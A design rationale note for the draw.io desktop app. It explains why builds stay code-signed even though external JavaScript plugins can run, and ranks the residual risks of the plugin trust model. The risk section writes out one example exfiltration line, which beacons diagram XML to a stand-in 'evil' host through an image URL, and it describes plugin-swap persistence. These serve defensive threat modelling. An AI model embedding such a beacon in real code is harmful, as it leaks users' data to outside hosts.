# draw.io Desktop plugin security & the signing question

This is a design/rationale note, not user documentation. It records
how the desktop plugin mechanism relates to code signing, why the app
stays **signed even though plugins can run arbitrary JavaScript**, and
which parts of the plugin trust model are worth hardening later. It
exists so the reasoning does not have to be reconstructed from scratch
the next time the question comes up.

## The question

The plugin concept lets fairly arbitrary JavaScript run inside the
desktop app. External plugins are only reachable when the app is
launched with `--enable-plugins`, but that is still *our* signed,
notarized app executing code we never reviewed. It can feel wrong to
put an Apple/Microsoft-backed signature on something that will then run
virtually anything — and one tempting "fix" is to say plugins require
an **unsigned** build.

The short answer: **keep signing, do not route plugin users to
unsigned builds.** The unease rests on a misreading of what a signature
attests, and — on macOS specifically — the interpreted-JS design means
loading a plugin never engages the protection that unsigning would
supposedly "come clean" about. The genuine weaknesses are elsewhere and
are not fixed by unsigning.

## 1. How plugins work today

There are two tiers.

**Built-in / curated plugins** ship *inside* the signed bundle at
`./plugins/*.js` and are authored by JGraph. They are listed in
`App.pluginRegistry` / `App.publicPlugin`
(`drawio/src/main/webapp/js/diagramly/App.js`) and load without any
flag — selecting one from the Plugins dialog dropdown just records its
id in settings.

**External plugins** are the only arbitrary-code path, and they are
gated three ways:

1. The app must be launched with `--enable-plugins` (`src/main/args.js`,
   key `enablePlugins`). It is **off by default** — `installPlugin`
   and `getPluginFile` early-return empty otherwise
   (`src/main/electron.js`, `isPluginsEnabled` / `installPlugin` /
   `getPluginFile`).
2. The user picks a `.js` file through a trusted file dialog.
3. They must click through the `pluginWarning` `confirm()`
   (`drawio/src/main/webapp/js/diagramly/ElectronApp.js`, the
   `plugins...` action; string in `resources/dia*.txt`).

On accept, `installPlugin` copies the file into
`<appData>/plugins/`; on every later launch **with the flag**,
`getPluginFile` returns it and it is injected with `mxscript()` (a
`<script>` tag) into the renderer (the load loop in `ElectronApp.js`).

### What an external plugin can and cannot do

Plugins run as renderer-context JavaScript, **not** with the app's full
native privileges:

- `contextIsolation: true`, no `nodeIntegration` → no `require`, no
  `fs`, no `child_process`, no native code, no process spawning. The
  only privileged channel is the `window.electron` contextBridge
  (`src/main/electron-preload.js`) → IPC, and every handler is guarded
  by `validateSender()`.
- File **writes** go through `assertWritablePath`
  (`src/main/electron.js`), gated by the `blessedPaths` allowlist
  (paths authorised via trusted UI: file picker, association, CLI).
  Writes inside `userData`/`appBaseDir` are denied, and symlinks are
  realpath-resolved to defeat traversal.
- CSP (`src/main/electron.js`, `onHeadersReceived`) sets
  `connect-src 'self'` → no `fetch` / XHR / WebSocket / `sendBeacon` to
  remote hosts. A file:// allowlist (`onBeforeRequest`) only permits
  loading scripts from the app code dir and, when enabled, the
  `<appData>/plugins/` dir.

So a hostile external plugin is best understood as **"a malicious web
page that additionally can read/write the specific files the user has
blessed"** — weaker than arbitrary native code, and only reachable
behind a default-off flag. That is already stronger than several peers
(Obsidian community plugins run with full host privileges and Obsidian
still ships signed).

## 2. What signing does and does not attest

The instinct "it's weird to sign something that can run anything"
conflates two different things:

- **App Store review** — a behavioural/policy audit of what the app
  *does*. Desktop draw.io does not go through this.
- **Code signing + notarization** — a statement of **provenance and
  integrity**: "this exact binary was built by JGraph and is
  untampered," plus, for macOS notarization, "an automated malware scan
  of *this build* found nothing."

Apple describes notarization as identifying and blocking malicious
software *prior to distribution*, "without requiring App Review" — it
scans the submitted build and issues a ticket; it does **not** audit
runtime behaviour or constrain what code the app may later load.
Windows Authenticode is the same shape: it binds the binary to a
verified publisher identity and proves integrity, and says nothing
about what the app may execute.

Consequences:

- A user loading a malicious plugin is **not** "JGraph shipped
  malware." The malicious artifact is the user's `.js`, which is
  neither signed by us nor covered by our notarization ticket.
- Reputation/revocation systems act on the *shipped binary's own*
  behaviour. SmartScreen's PUA criteria target deception, silent
  installs, and bundling — the opposite of an off-by-default,
  consent-gated loader. Apple revokes Developer ID for malware *in the
  distributed software itself*, and notarization lets Apple revoke a
  single weaponized *build* rather than the whole identity.
- Every general-purpose host is signed while running arbitrary user
  code: browsers (JS/WASM), Office (VBA), PowerShell, Node/Python, and
  every Electron app including VS Code. Signing a scriptable host is
  the norm.

## 3. The macOS detail that settles it

On macOS the protection that governs *arbitrary code execution* is
**Library Validation** under the Hardened Runtime — and it applies only
to native Mach-O libraries loaded into the process. An app that wants
to load unsigned/third-party **native** plug-ins must add the
`com.apple.security.cs.disable-library-validation` entitlement. Adding
that entitlement is the move that genuinely weakens the signature's
meaning.

draw.io does **not** carry that entitlement, and correctly so: a `.js`
plugin is **data handed to the already-loaded JavaScript engine**, not
a native library mapped into the address space. No new native code is
loaded, so Library Validation is never consulted. The
`allow-jit` / `allow-unsigned-executable-memory` entitlements Electron
already ships cover the JS engine generating its own machine code
(JIT); plugin JS runs by the identical mechanism as any other page
script, with no extra entitlement and **zero effect on
signing/notarization status**.

The OS's own model draws the hard line here: "inject unsigned native
code" (requires relaxing a protection — the arguably "weird" thing) vs.
"interpret script in an already-trusted engine" (routine, no
relaxation). draw.io is firmly on the benign side of that line.

## 4. Why not "unsigned builds for plugins"

Across VS Code, Obsidian, Office, Chrome/Firefox and Figma, the
universal pattern is **signed host + a consent gate and/or reviewed
marketplace**. No reputable app forces users onto an unsigned build to
unlock extensions. An unsigned draw.io would:

- **macOS:** lose notarization → Gatekeeper quarantines it on download
  and blocks launch. macOS Sequoia removed the old right-click-Open
  bypass, so users must use System Settings › Privacy & Security ›
  "Open Anyway" or strip the quarantine xattr on every install. It also
  loses the **Quick Look extension** in practice (the system won't
  activate a Quick Look `.appex` inside an un-notarized, quarantined
  host), and forfeits Apple's ability to revoke a single weaponized
  build rather than the whole Developer ID.
- **Windows:** lose Azure Trusted Signing → SmartScreen "unknown
  publisher" (which never accrues reputation), UAC "unknown publisher,"
  **Smart App Control blocking unsigned binaries on Windows 11**, and
  denial under enterprise WDAC/AppLocker publisher rules.
- **Updates:** fall off the auto-update path in practice
  (electron-updater signature/staging checks dislike ad-hoc /
  un-notarized builds, and the personal-build flow pairs with
  `disableUpdate`), so the higher-risk *plugin* channel becomes the one
  that stops receiving Electron/Chromium security patches — backwards.
- **Security irony:** it pushes the most extension-hungry users onto
  the least-protected binary and trains them to click through
  Gatekeeper/SmartScreen, normalising the bypass. A signed host loading
  a flag-gated, sandboxed plugin is strictly safer than an unsigned
  host running the same plugin.

The `--enable-plugins` default-off flag is the right primary control;
it has no signing/notarization consequence and already means users who
never touch plugins have zero exposure.

## 5. Residual risks (ranked)

These are real and worth attention. None of them is "the app is
signed," and none is fixed by unsigning.

1. **Exfiltration via `img-src *` / `media-src *`.** `connect-src
   'self'` blocks fetch/XHR/WebSocket, but does **not** govern
   image/media loads. A plugin can `new Image().src =
   'https://evil/?d=' + encodeURIComponent(diagramXml)` and beacon out
   anything the page can see (diagram contents, blessed-file reads,
   clipboard). One-directional GET; highest-impact residual capability.
   Tradeoff: tightening `img-src`/`media-src` to `'self' data:` would
   break diagrams that legitimately reference remote images, so a
   blanket clamp is probably not worth it.
2. **One-time consent, then silent auto-load forever.** The `confirm()`
   fires once at install; afterwards the plugin auto-loads on every
   launch (with the flag) with no re-consent and no indicator of which
   plugins are live. One click grants permanent, silent, per-launch
   execution.
3. **No integrity pinning.** `installPlugin` copies the `.js` verbatim
   with no hash/signature/content check, and deliberately bypasses
   `assertWritablePath`. Any co-resident process running as the same
   user that can write to `<appData>/plugins/` can drop or swap a
   plugin that then executes in the renderer on next launch — a
   persistence primitive. Bounded: presupposes the flag is already in
   use and same-user filesystem access (already meaningful compromise).

## 6. Possible hardening (if/when we invest)

In priority order, all orthogonal to signing:

- **Hash-pin installed plugins.** Record a hash at install time and
  re-verify before auto-load (`installPlugin` / `getPluginFile` in
  `src/main/electron.js`). Closes risk #3 and detects swaps.
- **Plugin management + active-plugin indicator, re-consent on
  change.** Surface which external plugins auto-load and re-prompt when
  a plugin's bytes change. Softens risk #2.
- **Address the exfil channel** (risk #1): at minimum document it; at
  most, apply a tighter CSP scoped to sessions where an external plugin
  is active, rather than clamping `img-src` globally.
- **Improve the warning copy.** The current `pluginWarning` is generic;
  name the file and state plainly that the plugin can read open
  diagrams and send data out.

## 7. Recommendation / status

- Keep the app **signed and notarized**. It is correct and the norm for
  scriptable hosts; on macOS the interpreted-JS design means plugins
  never engage Library Validation.
- **Do not** create an unsigned plugin build. Unprecedented, worse for
  the users who'd use it, and it breaks Quick Look, updates, and
  enterprise deployability.
- Treat `--enable-plugins` (default-off) as the primary control.
- If we invest, invest in **consent + integrity + the exfil channel**,
  in that order. These are defense-in-depth polish, not fire drills.

The grain of truth in the original unease is a *communication* problem,
not a signing problem: our signature travels with bytes that then run
attacker-authored JS, and a naive observer could over-read what
"signed" implies about safety. The remedy is clearer consent UI and
this note — not removing the signature that protects everyone else.
